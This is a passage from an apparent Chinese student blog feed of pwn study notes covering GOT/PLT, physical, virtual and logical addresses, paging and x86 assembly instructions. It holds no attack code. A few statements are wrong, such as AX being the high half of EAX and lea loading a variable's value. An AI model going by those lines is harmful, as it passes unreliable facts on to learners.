表项而言，在编译阶段保存的是 .plt 表的起始位置，对于数据引用的 plt 表项而言，编译阶段的值为 0。</p><p>plt 的作用是为每一次模块外部的函数调用设置一小段跳转代码。在 arm 编译器的实现中，对于每一项外部跳转，对应 plt 中三条指令。和 got 类似，plt 的前面部分也被系统”征用”了，这部分负责调用动态链接器中的符号解析函数完成动态解析工作，后续的部分才是对应具体外部跳转的指令。</p><p>在程序的编译阶段，plt 跳转指令表项和 got 表项就实现了绑定，其映射关系为：plt 第一段跳转指令对应 got 第四个表项，plt 第二段跳转指令对应 got 第五个表项，以此类推。</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-33-10.png"></p><p>🌰：<br>对于一个c语言文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world1!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world2!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对其进行编译后查看其main函数的反汇编结果</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_16-58-54.png"></p><blockquote><p>%rip是一个指针，此处相当于寄存器相对寻址</p></blockquote><p>在<code>0x40054d</code>调用了<code>0x400430&lt;puts@plt&gt;</code>，当程序rip到400340时，需要执行的操作对应的汇编代码为：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-00-02.png"></p><hr><p>陆陆续续把基础的小零碎学完啦！🥳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理地址，虚拟地址和逻辑地址</title>
    <link href="/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>关于物理地址，虚拟地址和逻辑地址的定义和之间的关系</p><span id="more"></span><p>虽然写了这么多知识点但脑袋还是乱乱的，希望哪天突然开窍叭🥱</p><h3 id="理解内存"><a href="#理解内存" class="headerlink" title="理解内存"></a>理解内存</h3><p>我们平时使用的各种数据都是存储在硬盘等存储器上，但硬盘的运行速度很慢。所以需要运行程序或者使用数据时，这些数据必须从硬盘上转到另一种容量小但速度快很多的存储器，之后才送进CPU进行处理。这中间的存储器就是内存。</p><p>无论何种存储器，软盘、硬盘、光盘或者内存，都有地址。</p><p>其中：</p><ul><li>我们程序所使用的内存地址叫做<strong>虚拟内存地址</strong>（<em>Virtual Memory Address</em>）</li><li>实际存在硬件里面的空间地址叫<strong>物理内存地址</strong>（<em>Physical Memory Address</em>）。</li></ul><h1 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h1><p><strong>物理地址就是常说的内存地址，是内存当中存储数据的一个标识，并不是数据本身，通过内存地址可以找到内存当中存储的数据。</strong></p><p>计算机将内存划分为一个个小的内存单元，同时对其编号，这样就能有效管理内存。在空间划分实践中，一个<strong>内存单元</strong>的大小为1<strong>字节</strong>。一个字节是八个比特，相当于八个二进制位，两个十六进制位。</p><blockquote><p>可以理解为一栋叫内存的楼，每一套商品房都有自己的门牌号叫内存单元，每一个家庭是一个数据，每一位家庭成员所居住的小房间则不会进行编号。</p></blockquote><p>每个内存单元都有编号（内存编号），内存编号可以称为<strong>地址</strong>，在<code>C</code>语言中也称为<strong>指针</strong>。</p><h5 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a>🌰</h5><p>在内存中存储”修饰符“或”MOD“，可以示意为：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-28_20-14-36.png"></p><p>![]&#x2F;img&#x2F;物理地址，虚拟地址和逻辑地址&#x2F;Snipaste_2023-03-28_20-23-49.png)</p><blockquote><p>数字后面加H表示十六进制</p></blockquote><p>在第一行中，每一格表示一段内存，而格子里的内容是这段内容记下的数据；第二行中每一格内数字就是对应的内存的地址。</p><p>汉字在一个地址空间里储存不下，会放进两个连续的地址空间里。而字母或者阿拉伯数字就可以放进一个内存地址里。在上图中，”修“的内存地址为1000H，或者M的内存地址为”1000H”。</p><h1 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h1><p>虚拟存储器不是任何实际的物理存储器，而是借助磁盘等辅助存储器来扩大主存容量，使之为更大或更多的程序所使用。</p><p><strong>虚拟地址用于指示虚拟存储器的地址，它是用逻辑地址指示的</strong></p><p>在程序运行时，我们需要将进程与物理地址映射起来，才能区分这些内存中存储的数据属于哪个进程。但内存大小有限，进程却可以很多，甚至可能同时进行多个进程。为了实现让很多进程共用一个存储资源有限的内存，我们引出虚拟地址的概念，我们先将进程与虚拟地址映射起来，再将虚拟地址与物理地址映射起来。</p><p>操作系统引入了虚拟内存，进程持有的虚拟地址会通过 CPU 芯片中的内存管理单元（MMU）的映射关系，来转换变成物理地址，然后再通过物理地址访问内存，如下图所示：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-0204ff048148735a260fa5f94f475f14_r.png"></p><h1 id="逻辑地址"><a href="#逻辑地址" class="headerlink" title="逻辑地址"></a>逻辑地址</h1><p>逻辑地址，就是指机器语言指令中用来指定一个操作数或一条指令的地址，<strong>由一个段(segment)和偏移量(offset)组成</strong>，说地直白点就是CPU拿到的地址。</p><p>段号：用来查找段的起始地址，它被存储在段寄存器当中</p><p>偏移地址：是存储单元的物理地址与所在起始段的差值</p><h1 id="各种内存的关系"><a href="#各种内存的关系" class="headerlink" title="各种内存的关系"></a>各种内存的关系</h1><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/bba9443a9c0249ffa501df86649ce5d8.png"></p><h2 id="虚拟地址和物理地址"><a href="#虚拟地址和物理地址" class="headerlink" title="虚拟地址和物理地址"></a>虚拟地址和物理地址</h2><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>程序是由若干个逻辑分段组成的，如可由代码分段、数据分段、栈段、堆段组成。不同的段是有不同的属性的，所以就用分段（Segmentation）的形式把这些段分离出来。</p><p>分段机制下的虚拟地址由两部分组成，<strong>段选择子</strong>和<strong>段内偏移量</strong>。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><h4 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h4><p>段选择子保存在寄存器里。段选择子最重要的是段号，用作段表的索引。段表里保存的是这个段的基地址、段的界限和特权等级等。</p><p>段选择子是十六位的，其中十四位表示地址信息</p><h4 id="段偏移量"><a href="#段偏移量" class="headerlink" title="段偏移量"></a>段偏移量</h4><p>偏移量定义为：把存储单元的<strong>实际地址</strong>与其所在段的<strong>段地址</strong>之间的距离称为段内偏移，也称为“有效地址”或“偏移量”。</p><p>虚拟地址中的段偏移量应该位于0和段界限之间。如果段内偏移量是合法的，就将其段及地址加到段内偏移量得到物理内存地址。</p><p>分段机制会把程序的虚拟地址分成 4 个段，每个段在段表中有一个项，在这一项找到段的基地址，再加上偏移量，于是就能找到物理内存中的地址。</p><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ul><li>内存碎片</li></ul><p>举例来说。假设我们现在占有 1G 的物理内存，用户执行了多个程序，游戏占用了 512MB 内存，浏览器占用了 128MB 内存，音乐占用了 256 MB 内存。</p><p>这个时候，我们关闭浏览器，则空闲内存还有 1024 - 512 - 256 &#x3D; 256MB。但如果这个 256MB 不是连续的，被分成了两段 128 MB 内存，这就会导致没有空间再打开一个 200MB 的程序。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><p>这里的内存碎片的问题共有两处地方：</p><p>外部内存碎片，也就是产生了多个<strong>不连续</strong>的小物理内存，导致新的程序无法被装载；</p><p>内部内存碎片，程序所有的内存都被装载到了物理内存，但是这个程序有部分的内存可能并不是很常使用，这也会导致<strong>内存的浪费</strong></p><ul><li>内存交换效率低</li></ul><p>对于外部内存碎片的问题，我们采用内存交换的解决措施。</p><p>可以把音乐程序占用的那 256MB 内存写到硬盘上，然后再从硬盘上读回来到内存里。不过再读回的时候，我们不能装载回原来的位置，而是紧紧跟着那已经被占用了的 512MB 内存后面。这样就能空缺出连续的 256MB 空间，于是新的 200MB 程序就可以装载进来。</p><p>对于多进程的系统来说，用分段的方式，内存碎片是很容易产生的，产生了内存碎片，那不得不重新重新规划内存区域，这个过程会产生性能瓶颈。</p><p>因为硬盘的访问速度要比内存慢太多了，每一次内存交换，我们都需要把一大段连续的内存数据写到硬盘上。</p><p>所以，<strong>如果内存交换的时候，交换的是一个占内存空间很大的程序，这样整个机器都会显得卡顿。</strong></p><h3 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h3><p>为了解决内存分段的内存碎片和内存交换效率低的问题，就出现了内存分页。<strong>分页是把整个虚拟和物理内存空间切成一段段固定尺寸的大小</strong>。这样一个连续并且尺寸固定的内存空间，我们叫<strong>页</strong>（<em>Page</em>）</p><p>虚拟地址与物理地址之间通过页表来映射：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-e63c20d1bace757600fccb051a29eaf6_720w.webp"></p><p>页存储在内存里，由CPU的内存管理单元即MMU负责映射转换的工作吗，这样CPU 就可以直接通过 MMU，找出要实际要访问的物理内存地址。</p><p>由于内存空间都是预先划分好的，也就不会像分段会产生间隙非常小的内存。采用了分页，那么释放的内存都是以页为单位释放的，也就不会产生无法给进程使用的小内存。</p><p>如果内存空间不够，操作系统会把其他正在运行的进程中的「最近没被使用」的内存页面给释放掉，也就是暂时写在硬盘上，称为<strong>换出</strong>（<em>Swap Out</em>）。一旦需要的时候，再加载进来，称为<strong>换入</strong>（<em>Swap In</em>）。所以，一次性写入磁盘的也只有少数的一个页或者几个页，不会花太多时间，内存交换的效率就相对比较高。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-23f19a580a47fa6c731b32d7df6b6735_720w.webp"></p><p>在分页机制下，虚拟地址分为两部分，<strong>页号</strong>和<strong>页内偏移</strong>。页号作为页表的索引，<strong>页表</strong>包含物理页每页所在<strong>物理内存的基地址</strong>，这个基地址与页内偏移的组合就形成了物理内存地址</p><h4 id="其他东西"><a href="#其他东西" class="headerlink" title="其他东西"></a>其他东西</h4><p>再来，为了解决简单分页产生的页表过大的问题，就有了<strong>多级页表</strong>，它解决了空间上的问题，但这就会导致 CPU 在寻址的过程中，需要有很多层表参与，加大了时间上的开销。于是根据程序的<strong>局部性原理</strong>，在 CPU 芯片中加入了 <strong>TLB</strong>，负责缓存最近常被访问的页表项，大大提高了地址的转换速度。</p><hr><p>冲浪冲到的，我觉得比起枯燥的文字，这个更好理解</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-29_21-54-52.png"></p><hr><p>之前觉得自己很牛直接开始做题，靠一些老本还是能做几道题，但最近发现偏移量和内存地址啥的根本不会看也不会算，还是老老实实打基础叭😳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86汇编基础</title>
    <link href="/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>32bit的x86汇编基础，包括一些常规指令，内存和寻址模式</p><span id="more"></span><p>总觉得学了又好像没学······</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><img src="/img/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86-registers.png"></p><p>现代 x86 处理器有 8 个 32 bit 寄存器，如上图所示。</p><p>寄存器名字是早期计算机历史上流传下来的。</p><ul><li>EAX：一般用作累加器(Accumulator)</li><li>EBX：一般用作基址寄存器(Base)</li><li>ECX：一般用来计数(Count)</li><li>EDX：一般用来存放数据(Data)</li><li>ESI：一般用作源变址(Source Index)</li><li>EDI：一般用作目标变址(Destinatin Index)</li><li>ESP：一般用作堆栈指针(Stack Pointer)</li><li>EBP：一般用作基址指针(Base Pointer)</li></ul><p>现在大部分寄存器的名字已经失去了原来的意义，但有两个是例外：<strong>栈指针寄存器（Stack Pointer）ESP 和基址寄存器（ Base Pointer）EBP</strong>。</p><p>对于 <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> 四个寄存器，可以再将 32bit 划分成多个子寄存器， 每个子寄存器有专门的名字。例如 <code>EAX</code> 的高 16bit 叫 <code>AX</code>（去掉 E, 据说E表示 Extended）,低 8bit 叫 <code>AL</code> (Low）, 8-16bit 叫 <code>AH</code> （High）。</p><p>在汇编语言中，这些寄存器的名字是<strong>大小写无关</strong>的，既可以用 <code>EAX</code>，也可以写 <code>eax</code>。</p><h1 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h1><h3 id="程序重定位"><a href="#程序重定位" class="headerlink" title="程序重定位"></a>程序重定位</h3><ul><li>存放程序的为代码段，存放数据的为数据段</li><li>真实的内存单元地址称为物理地址，而程序中的地址为逻辑地址</li></ul><p>由于程序并不知道自己会被加载到哪，因此访存如果用绝对地址将会出错，在执行程序时就需要<strong>程序重定位</strong>这个操作。</p><p>该操作在汇编中通过<code>org</code>指令实现，如<code>org 0A100h</code>代表该程序中的所有标号都以<code>0A100h</code>做偏移。</p><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>将内存分段后，程序只需要识别偏移地址就可以确定数据位置。程序重定位通过设置代码段CS寄存器和数据段DS寄存器实现。</p><p>在8086中，地址总线是20位的，需要将段寄存器左移4位（<code>0x10h</code>，相当于16进制左移1位）变为20位，然后再同偏移地址相加。</p><p>两种典型情况</p><ul><li>因为段寄存器是16位的，在段不重叠的情况下，最多可以将1MB的内存分成65536个段，每个段16B，偏移地址从<code>0000H</code>到<code>000FH</code></li><li>同样在不允许段之间重叠的情况下，因为偏移地址也是16位，1MB的内存最多只能划分成16个段，每段长64KB，段地址由<code>0000H</code>到<code>F000H</code></li></ul><h3 id="声明静态数据区"><a href="#声明静态数据区" class="headerlink" title="声明静态数据区"></a>声明静态数据区</h3><p><code>.DATA</code>：声明静态存储区</p><p>数据类型修饰语：</p><p><code>DB/db</code>：Byte,1Byte</p><p><code>DW/dw</code>：Word,2Byte</p><p><code>DD/dd</code>：Double Word,4Bytes</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.DATA<br>var     DB 64    ; 声明一个 byte 值, referred to as location var, containing the value 64.<br>var2    DB ?     ; 声明一个未初始化 byte 值, referred to as location var2.<br>        DB 10    ; 声明一个没有 label 的 byte 值, containing the value 10. Its location is var2 + 1.<br>X       DW ?     ; 声明一个 2-byte 未初始化值, referred to as location X.<br>Y       DD 30000 ; 声明一个 4-byte 值, referred to as location Y, initialized to 30000.<br></code></pre></td></tr></table></figure><p><strong>在汇编中只有一维数组</strong>，没有二维和多维数组。一维数组其实就是内存中的一块连续区域。<code>DUP</code> 和字符串常量也是声明数组的两种方法。</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Z       DD 1, 2, 3      ; 声明 3 个 4-byte values, 初始化为 1, 2, and 3. The value of location Z + 8 will be 3.<br>bytes   DB 10 DUP(?)    ; 声明 10 个 uninitialized bytes starting at location bytes.<br>arr     DD 100 DUP(0)   ; 声明 100 个 4-byte words starting at location arr, all initialized to 0<br>str     DB &#x27;hello&#x27;,0    ; 声明 6 bytes starting at the address str, 初始化为 hello and the null (0) byte.<br></code></pre></td></tr></table></figure><h3 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h3><p>有多个指令可以用于内存寻址。如果要访问某一大小的内存，则通过添加修饰词<code>byte</code>、<code>word</code>、<code>dword</code>实现。</p><p>🌰：</p><p>其中<code>MOV</code> 将在内存和寄存器之间移动数据，接受两个参数：第一个参数是目的地，第二个是源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov byte[ebx], 2<br></code></pre></td></tr></table></figure><h3 id="函数调用-call-堆栈组织"><a href="#函数调用-call-堆栈组织" class="headerlink" title="函数调用(call)堆栈组织"></a>函数调用(call)堆栈组织</h3><h4 id="Caller规则"><a href="#Caller规则" class="headerlink" title="Caller规则"></a>Caller规则</h4><ol><li>在调用函数&#x2F;子程序(subroutine)之前，先保存特定寄存器的状态(caller-saved)（包括<code>eax</code>、<code>ecx</code>、<code>edx</code>）</li><li>将要传的参数堆栈（注意要逆序，<strong>最后一个参数最先入</strong>）。因为栈往下生长，因此第一个参数会被存在最低的地址</li><li>调用函数，<code>call</code>会将返回地址<code>eip</code>压入栈中</li><li>返回时先把参数移出栈，然后将原来保存的寄存器再pop出来</li></ol><h4 id="Callee规则"><a href="#Callee规则" class="headerlink" title="Callee规则"></a>Callee规则</h4><ol><li><p>将<code>ebp</code>推入栈，将<code>esp</code>的值拷贝入<code>ebp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp, esp<br></code></pre></td></tr></table></figure></li><li><p>分配局部变量，栈由上向下增长，如分配3个4B，则<code>sub esp, 12</code></p></li><li><p>保存寄存器状态</p></li></ol><h1 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h1><p>机器指令通常分为三类：数据移动、算术&#x2F;逻辑和控制流。</p><p>接下来的符号解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;reg32&gt; ; 任何32位寄存器 （EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP）<br>&lt;reg16&gt;; 任何16位寄存器 （AX, BX, CX, or DX）<br>&lt;reg8&gt;; 任何8位寄存器 （AH, BH, CH, DH, AL, BL, CL, or DL）<br>&lt;reg&gt;; 任何寄存器<br>&lt;mem&gt;; 一个内存地址 （e.g., [eax], [var + 4], or dword ptr [eax+ebx]）<br>&lt;con32&gt;; 任何32位常量<br>&lt;con16&gt;; 任何16位常量<br>&lt;con8&gt;; 任何8位常量<br>&lt;con&gt;; 任何8、16、32位常量<br></code></pre></td></tr></table></figure><h2 id="数据移动"><a href="#数据移动" class="headerlink" title="数据移动"></a>数据移动</h2><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov指令将第二操作对象（寄存器、内存内容或是常量值）所引用的数据项复制到其第一操作对象（寄存器或是内存）所引用的位置。</p><p>寄存器到寄存器的移动是合法的，但是直接内存到内存的移动是不合法的。在需要内存传输的情况下，必须首先将源内存中的内容加载到寄存器中，然后才能将其存储到目标内存地址。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov &lt;reg&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;mem&gt;<br>mov &lt;mem&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;const&gt;<br>mov &lt;mem&gt;,&lt;const&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax, ebx ; 将EBX中的值复制到EAX<br>mov byte ptr [var], 5 ; 将5存储到地址var的一个字节中<br></code></pre></td></tr></table></figure><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>ESP（堆栈指针）通过push递减。</p><p>push指令将其操作对象放在内存中硬件支持堆栈的顶部。具体地说，PUSH首先将ESP递减4，然后将其操作对象放入内存地址[ESP]处的32位大小的区域中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push &lt;reg32&gt;<br>push &lt;mem&gt;<br>push &lt;con32&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax ; 将eax入栈<br>push [var] ; 将地址var处开始的4个字节入栈<br></code></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>pop指令将4字节数据元素从硬件支持的堆栈顶部移至指定的操作对象（即寄存器或内存位置）。它首先将位于内存位置[SP]的4个字节移动到指定的寄存器或内存位置，然后将SP递增4。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop &lt;reg32&gt;<br>pop &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop edi ; 将堆栈的顶部元素弹出到EDI中<br>pop [ebx] ; 将堆栈的顶部元素弹出到内存从EBX位置开始的四个字节中<br></code></pre></td></tr></table></figure><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea指令将其第二个操作对象指定的地址放入其<strong>第一个操作对象指定的寄存器中</strong>。需要注意的是，内存位置的内容不会被加载，并且只有有效地址会被计算并放入寄存器中。这对于获取指向内存区域的指针非常有用。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea &lt;reg32&gt;,&lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea edi, [ebx+4*esi] ; 将地址EBX+4*ESI放入EDI<br>lea eax, [var] ; 将var中的值放在EAX中<br></code></pre></td></tr></table></figure><h2 id="算数和逻辑运算符"><a href="#算数和逻辑运算符" class="headerlink" title="算数和逻辑运算符"></a>算数和逻辑运算符</h2><h4 id="add-整数加法"><a href="#add-整数加法" class="headerlink" title="add-整数加法"></a>add-整数加法</h4><p>add指令将其两个操作对象相加，将结果存储在第一个操作对象中。需要注意的是，虽然两个操作对象都可以是寄存器，<strong>但最多只有一个操作对象可以是内存位置</strong>。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add &lt;reg&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;mem&gt;<br>add &lt;mem&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;con&gt;<br>add &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax, 10 ; EAX ← EAX + 10<br>add BYTE PTR [var], 10 ; 将存储在内存地址var的单字节值加上10<br></code></pre></td></tr></table></figure><h4 id="sub-整数减法"><a href="#sub-整数减法" class="headerlink" title="sub-整数减法"></a>sub-整数减法</h4><p>sub指令将其第一个操作对象的值减去第二个对象的值，并将结果存储在第一个对象的内存位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub &lt;reg&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;mem&gt;<br>sub &lt;mem&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;con&gt;<br>sub &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al, ah ; AL ← AL - AH<br>sub eax, 216 ; 从存储在EAX中的值中减去216<br></code></pre></td></tr></table></figure><h4 id="inc-dec-递增，递减"><a href="#inc-dec-递增，递减" class="headerlink" title="inc,dec-递增，递减"></a>inc,dec-递增，递减</h4><p>inc指令将其操作对象的内容+1；DEC指令将其操作对象的内容-1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc &lt;reg&gt;<br>inc &lt;mem&gt;<br>dec &lt;reg&gt;<br>dec &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax ; 从EAX的内容中减去1<br>inc DWORD PTR [var] ; 将存储在位置var的32位整数加1<br></code></pre></td></tr></table></figure><h4 id="imul-整数乘法"><a href="#imul-整数乘法" class="headerlink" title="imul-整数乘法"></a>imul-整数乘法</h4><p>imul指令有两种基本格式：两个操作对象和三个操作对象。</p><p>有两个操作对象时将其两个操作对象相乘，并将结果储存在第一个操作对象当中，其中，第一个对象必须是寄存器。</p><p>有三个操作对象时，将第二个操作对象与第三个操作对象相乘，并将其结果储存在第一个操作对象当中，其中第一个对象必须是寄存器，第三个对象必须是常量值。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul &lt;reg32&gt;,&lt;reg32&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;<br>imul 